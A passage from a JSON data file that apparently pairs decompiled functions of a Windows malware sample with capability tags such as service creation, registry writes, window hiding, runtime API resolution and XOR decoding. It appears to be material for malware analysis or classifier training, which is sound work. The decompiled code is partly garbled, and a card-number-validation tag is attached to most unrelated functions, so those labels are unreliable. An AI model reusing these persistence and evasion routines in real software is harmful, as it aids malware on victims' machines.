(*0x41f4c4 == 0) {\n        return 0;\n    }\n    pcVar6 = (*pcVar9)();\n    if (pcVar6 == NULL) {\n        return 0;\n    }\n    uStack60 = 0x401b12;\n    *0x41f4c0 = (*puVar4)();\n    if (*0x41f4c0 == 0) {\n        return 0;\n    }\n    uStack60 = 0x4061c8;\n    pcStack64 = pcVar6;\n    while( true ) {\n        uStack68 = 0x401b41;\n        *0x41f4b4 = (*puVar4)();\n        if (*0x41f4b4 == 0) {\n            return 0;\n        }\n        uStack68 = 0x4061dc;\n        uStack76 = 0x401b77;\n        pcStack72 = pcVar6;\n        uStack76 = (*puVar4)();\n        bVar10 = (POPCOUNT(uStack76 & 0xff) & 1U) == 0;\n        if (uStack76 == 0) {\n            *0x41f4b8 = uStack76;\n            return 0;\n        }\n        *0x41f4b8 = uStack76;\n        if ((bVar10) || (!bVar10)) break;\n        ppcVar3 = segment(in_SS, *0x10 + -0x48);\n        pcVar7 = *ppcVar3;\n        if (!bVar10) {\n            pcStack72 = 0xb7bc9ea5;\n            break;\n        }\n        *pcVar7 = *pcVar7 + pcVar7;\n        *unaff_EBX = *unaff_EBX + -0x5b;\n        unaff_EBX = pcVar7;\n    }\n    uStack76 = 0x4061f0;\n    uStack84 = 0x401bb3;\n    pcStack80 = pcVar6;\n    Var11 = (*puVar4)();\n    uVar8 = Var11;\n    bVar10 = uVar8 == 0;\n    if (bVar10) {\n        *0x41f4c8 = uVar8;\n        return 0;\n    }\n    *0x41f4c8 = uVar8;\n    if ((bVar10) || (!bVar10)) {\n        uVar8 = 1;\n    }\n    else {\n        puVar1 = puVar4 + 1;\n        uVar2 = in(Var11 >> 0x20);\n        *puVar4 = uVar2;\n        if (&stack0xffffffa4 < 1) {\n            *puVar1 = *puVar1 - unaff_EBX;\n            bVar10 = (POPCOUNT(*pcVar6 - *puVar1) & 1U) == 0;\n            iVar5 = (*(puVar4 + 5))(pcVar6 + 1, 0x406130);\n            *0x41f4d8 = iVar5;\n            if ((bVar10) || (!bVar10)) {\n                *0x41f4dc = (*(puVar4 + 5))(pcVar6 + 1, 0x406140);\n            }\n            else {\n                *(iVar5 + 0x40) = *(iVar5 + 0x40) + -0x61;\n                *pcVar6 = *pcVar6 + extraout_DL;\n                *0x41f4dc = iVar5 + 1U & 0xffffff00 | unaff_EBX[iVar5 + 1U & 0xff];\n            }\n            if (((*0x41f4d4 != 0) && (*0x41f4d8 != 0)) && (*0x41f4dc != 0)) {\n                return 1;\n            }\n            return 0;\n        }\n    }\n    uVar8 = uVar8 ^ 0xdee0ed6d;\n    *0x41f4cc = uVar8 & 0xffff0000 | uVar8 + (uVar8 >> 8) * -0x31;\n    *(*0x41f4cc + 1) = *(*0x41f4cc + 1) ^ unaff_EBX >> 8;\n    return *0x41f4cc;\n}\n",
        "token_count": 1514
    },
    "00401e70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00401e70(void)\n\n{\n    int32_t iVar1;\n    bool in_OF;\n    uint *unaff_retaddr;\n    uint in_stack_00000014;\n    uint in_stack_0000001c;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_retaddr = in_stack_0000001c;\n        return CONCAT44(in_stack_00000014, in_stack_0000001c);\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return CONCAT44(iVar1 % 5, iVar1 % 5 + 3);\n}\n",
        "token_count": 136
    },
    "00401f40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401f40(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 128
    },
    "00401fb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402015) overlaps instruction at (ram,0x00402014)\n// \n// WARNING: Removing unreachable block (ram,0x00401fef)\n\nint64_t __cdecl fcn.00401fb0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    uint32_t *puVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    char *pcVar4;\n    char *pcVar5;\n    bool bVar6;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return CONCAT44(in_EDX, arg_8h);\n    }\n    if (arg_8h <= pcVar2) {\n        do {\n            puVar1 = arg_8h + 0x3a1f8a0a;\n            *puVar1 = *puVar1 | 0xffffffcb;\n            if (*puVar1 == 0) {\n                iVar3 = arg_14h + -1;\n                bVar6 = true;\n                pcVar4 = arg_8h;\n                pcVar5 = arg_10h;\n                do {\n                    pcVar5 = pcVar5 + 1;\n                    pcVar4 = pcVar4 + 1;\n                    if (iVar3 == 0) break;\n                    iVar3 = iVar3 + -1;\n                    bVar6 = *pcVar4 == *pcVar5;\n                } while (bVar6);\n                if (bVar6) {\n                    return CONCAT44(arg_8h, arg_8h);\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar2);\n    }\n    return ZEXT48(arg_8h) << 0x20;\n}\n",
        "token_count": 428
    },
    "00403170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403170(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004012b0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "004031d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004031ff) overlaps instruction at (ram,0x004031fd)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004031d0(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    bVar3 = false;\n    var_8h = 0;\n    uVar1 = arg_14h;\n    if (arg_14h != 0) {\n        do {\n            if ((uVar1 < 0) || (uVar2 = arg_14h,  uVar1 >= 0)) {\n                uVar2 = arg_10h;\n            }\n            uVar1 = var_8h + 0x104d8b2f + bVar3;\n            *(var_8h + arg_10h) = *(uVar1 + uVar2) ^ *(uVar1 % arg_ch + arg_8h);\n            var_8h = var_8h + 1;\n            bVar3 = var_8h < arg_14h;\n            uVar1 = var_8h - arg_14h;\n        } while (bVar3);\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "00403460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004034aa) overlaps instruction at (ram,0x004034a5)\n// \n// WARNING: Removing unreachable block (ram,0x0040347e)\n\nvoid __cdecl fcn.00403460(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint arg_ch_00;\n    uchar *puVar3;\n    uint *puVar4;\n    bool bVar5;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    bVar5 = true;\n    var_4h = 0;\n    var_68h = 0;\n    puVar4 = &var_67h;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    uVar1 = fcn.00403270(&var_68h, &var_4h);\n    arg_ch_00 = var_4h;\n    puVar3 = &stack0xfffffffc;\n    if ((!bVar5) && (puVar3 = &stack0xfffffffc,  bVar5)) {\n        arg_ch_00 = uVar1;\n        puVar3 = *0x8b17b43a;\n    }\n    fcn.004031d0(puVar3 + -0x68, arg_ch_00, 0x40652c, 0x9f80);\n    puVar4 = *(puVar3 + 0xc);\n    **(puVar3 + 8) = 0x40652c;\n    *puVar4 = 0x9f80;\n    return;\n}\n",
        "token_count": 419
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.004048e0(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.004036d0(argv),  pcVar2 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar3 = _sym.imp.USER32.dll_GetDesktopWindow;\n        pcVar1 = _sym.imp.USER32.dll_TranslateMessage;\n        while (iVar5 != 0) {\n            (*pcVar1)(&lpMsg);\n            (*pcVar3)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar2)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "00403e00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value",
            "delete registry key"
        ],
        "decompiled_code": "\nvoid fcn.00403e00(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uchar *puStack296;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack271;\n    uint uStack267;\n    ushort uStack263;\n    uchar uStack261;\n    uchar uStack260;\n    uint uStack259;\n    \n    uStack275 = 0;\n    uStack271 = 0;\n    uStack267 = 0;\n    uStack276 = 0;\n    uStack263 = 0;\n    uStack260 = 0;\n    uStack261 = 0;\n    puVar4 = &stack0xfffffefd;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    fcn.00404b10();\n    puStack296 = 0x403e4a;\n    fcn.00404ab0(&stack0xfffffeec, 5);\n    pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack296 = &stack0xfffffefc;\n    puStack300 = 0x403e64;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack296 = 0x403e77;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack300 = &stack0xfffffee4;\n    puStack296 = 0x10;\n    uStack304 = 1;\n    uStack308 = 0x41f4d0;\n    uStack312 = 0x406368;\n    uStack316 = 0x80000000;\n    uStack320 = 0x403e97;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack320 = 0x4b;\n    uStack324 = 0x40639c;\n    uStack328 = 1;\n    uStack332 = 0x41f4d0;\n    (*pcVar2)(0x80000000, &stack0xfffffedc);\n    (*pcVar1)(&stack0xfffffec4, 0x4063e8, &stack0xfffffeb4);\n    (*pcVar2)(0x80000000, &stack0xfffffec4, 0x406424, 1, 0x40642c, 0x14);\n    return;\n}\n",
        "token_count": 657
    },
    "00403ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f3d) overlaps instruction at (ram,0x00403f3b)\n// \n\nvoid __cdecl fcn.00403ef0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t extraout_EDX;\n    ulong uVar3;\n    \n    uVar3 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n    iVar2 = uVar3 >> 0x20;\n    iVar1 = uVar3;\n    if (iVar1 != 0) {\n        if ((iVar1 < 0) || (iVar1 >= 0)) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n            iVar2 = extraout_EDX;\n        }\n        *(iVar2 + 2) = *(iVar2 + 2) + (&stack0x10458b72 >> 8);\n        return;\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "00404340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404357) overlaps instruction at (ram,0x00404355)\n// \n// WARNING: Removing unreachable block (ram,0x0040449c)\n// WARNING: Removing unreachable block (ram,0x00404511)\n// WARNING: Removing unreachable block (ram,0x0040436c)\n// WARNING: Removing unreachable block (ram,0x00404374)\n// WARNING: Removing unreachable block (ram,0x00404377)\n// WARNING: Removing unreachable block (ram,0x004042f8)\n// WARNING: Removing unreachable block (ram,0x00404304)\n// WARNING: Removing unreachable block (ram,0x004042ff)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404340(int16_t *arg_8h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    uint *puVar3;\n    uint *unaff_EDI;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    bool bVar7;\n    int32_t *var_8h;\n    uint32_t var_4h;\n    \n    if (((-1 < &var_8h) && (-1 >= &var_8h)) || (*arg_8h != 0x5a4d)) {\n        return 0;\n    }\n    bVar7 = CARRY4(*(arg_8h + 0x1e), arg_8h);\n    var_8h = *(arg_8h + 0x1e) + arg_8h;\n    if ((bVar7) || (!bVar7)) {\n        bVar7 = *var_8h == 0x4550;\n    }\n    else {\n        pcVar1 = var_8h + (bVar7 == false) + 0x7c8ecb0d;\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8127e95e;\n        *pcVar1 = *pcVar1 + pcVar1;\n        bVar7 = *pcVar1 == '\\0';\n    }\n    if (bVar7) {\n        if (var_8h[0x16] != 0) {\n            return 0;\n        }\n        var_4h = 0x40;\n        if (0x80 < *(arg_8h + 0x1e)) {\n            if (*(arg_8h + 0x1e) < 0xc0) {\n                var_4h = *(arg_8h + 0x1e) - 0x80;\n            }\n            uVar5 = var_4h;\n            var_8h = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n            if (var_8h != NULL) {\n                if ((-1 < var_8h) && (-1 >= var_8h)) {\n                    out(0xc4, var_8h);\n                    *unaff_EDI = var_8h;\n                }\n                uVar4 = 0;\n                if (uVar5 != 0) {\n                    do {\n                        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n                        uVar5 = uVar4 + 1;\n                        *(uVar4 + var_8h) = iVar2 % 0xff;\n                        uVar4 = uVar5;\n                    } while (uVar5 < var_4h);\n                }\n                puVar3 = var_8h;\n                puVar6 = arg_8h + 0x40;\n                for (uVar5 = var_4h >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n                    *puVar6 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                for (var_4h = var_4h & 3; var_4h != 0; var_4h = var_4h - 1) {\n                    *puVar6 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n                return 1;\n            }\n            return 0;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 1007
    },
    "00404860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "contain loop",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004048c4) overlaps instruction at (ram,0x004048c2)\n// \n\nuint __cdecl fcn.00404860(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t iVar6;\n    char *pcVar7;\n    uint8_t uVar8;\n    uint unaff_EBX;\n    uint *unaff_ESI;\n    uint8_t uVar9;\n    uchar uVar10;\n    uint8_t in_AF;\n    char cVar11;\n    char cVar12;\n    ulong uVar13;\n    ulong uVar14;\n    uint32_t in_stack_ffffffdc;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    \n    uVar4 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    uVar9 = 0;\n    if (uVar4 == 0) {\n        return 0;\n    }\n    cVar12 = SBORROW1(uVar4, '\\x01');\n    cVar3 = uVar4 + -1;\n    cVar11 = cVar3 < '\\0';\n    uVar10 = (POPCOUNT(cVar3) & 1U) == 0;\n    uVar13 = (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, uVar4);\n    uVar15 = uVar4;\n    if ((cVar12 == cVar11) && (cVar12 != cVar11)) {\n        iVar5 = (uVar13 >> 0x20) + 1;\n        puVar1 = uVar13 + 0x15;\n        uVar8 = unaff_EBX >> 8;\n        uVar9 = CARRY1(*puVar1, uVar8);\n        *puVar1 = *puVar1 + uVar8;\n        uVar10 = (POPCOUNT(*puVar1) & 1U) == 0;\n        iVar6 = extraout_ECX;\n    }\n    else {\n        in_stack_ffffffdc = 0x4048ad;\n        uVar16 = uVar4;\n        uVar14 = (*_sym.imp.MSVCRT.dll_fflush)(uVar4);\n        uVar13 = CONCAT44(uVar16, uVar14 >> 0x20);\n        iVar5 = uVar14;\n        iVar6 = extraout_ECX_00;\n        if (uVar10) goto code_r0x004048be;\n    }\n    uVar16 = uVar13 >> 0x20;\n    pcVar7 = uVar13;\n    uVar14 = CONCAT44(pcVar7, iVar5);\n    if (uVar10) {\n        out(*unaff_ESI, uVar13);\n        uVar9 = in_AF;\n        do {\n            cVar3 = iVar5 >> 8;\n            uVar9 = 9 < (iVar5 & 0xf) | uVar9;\n            iVar5 = CONCAT31(CONCAT21(iVar5 >> 0x10, cVar3 - uVar9), -uVar9);\n            uVar14 = CONCAT44(pcVar7, iVar5);\n            uVar15 = in_stack_ffffffdc & 0xffff | unaff_ESI << 0x10;\n        } while (uVar9 || cVar3 == *pcVar7);\n    }\ncode_r0x004048be:\n    piVar2 = uVar4 + (uVar14 >> 0x20) * 2;\n    *piVar2 = (*piVar2 + 0x7b) - uVar9;\n    *(iVar6 + 0x57) = uVar14;\n    (*_sym.imp.MSVCRT.dll_fclose)(uVar15, uVar16);\n    return 1;\n}\n",
        "token_count": 891
    },
    "00404ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ab0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00404b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b70(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = *(uVar2 + 8);\n    fcn.00401f40(hSCManager, uVar1);\n    uVar1 = fcn.00403ef0(hSCManager, uVar1, *(uVar2 + 0xc));\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 181
    },
    "004036d0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004036d0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x4104ac, 0x41f4d0, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 142
    },
    "00404530": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404530(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x406204, 0x406248, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 77
    },
    "00401c00": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401c67) overlaps instruction at (ram,0x00401c66)\n// \n\nuint fcn.00401c00(void)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char extraout_DL;\n    int32_t unaff_EBX;\n    code *pcVar6;\n    uchar uVar7;\n    bool bVar8;\n    float10 extraout_ST0;\n    float10 extraout_ST0_00;\n    \n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x406104);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    bVar8 = uVar4 < 0;\n    uVar7 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    if (uVar4 == 0) {\n        return 0;\n    }\n    if ((!bVar8) && (bVar8)) {\n        pcVar1 = uVar4 + 4;\n        *0x1c = extraout_ST0;\n        uVar4 = uVar4 + 5;\n        cVar3 = *pcVar1 - *0x4;\n        bVar8 = cVar3 < '\\0';\n        uVar7 = (POPCOUNT(cVar3) & 1U) == 0;\n    }\n    *0x41f4d4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4, 0x406114);\n    if ((!bVar8) && (bVar8)) {\n        pcVar2 = pcVar6 + 4;\n        pcVar1 = uVar4 + 4;\n        *(pcVar6 + 0x1c) = extraout_ST0_00;\n        pcVar6 = pcVar6 + 5;\n        uVar4 = uVar4 + 5;\n        uVar7 = (POPCOUNT(*pcVar1 - *pcVar2) & 1U) == 0;\n    }\n    iVar5 = (*pcVar6)(uVar4, 0x406130);\n    *0x41f4d8 = iVar5;\n    if ((uVar7) || (!uVar7)) {\n        *0x41f4dc = (*pcVar6)(uVar4, 0x406140);\n    }\n    else {\n        *(iVar5 + 0x40) = *(iVar5 + 0x40) + -0x61;\n        *(uVar4 - 1) = *(uVar4 - 1) + extraout_DL;\n        *0x41f4dc = iVar5 + 1U & 0xffffff00 | *(unaff_EBX + (iVar5 + 1U & 0xff));\n    }\n    if (((*0x41f4d4 != 0) && (*0x41f4d8 != 0)) && (*0x41f4dc != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 686
    },
    "00403fe0": {
        "rules": [
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403fe0(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar3 == 0) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 != 0x420)) &&\n       (iVar3 = (*pcVar1)(),  iVar3 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 237
    }
}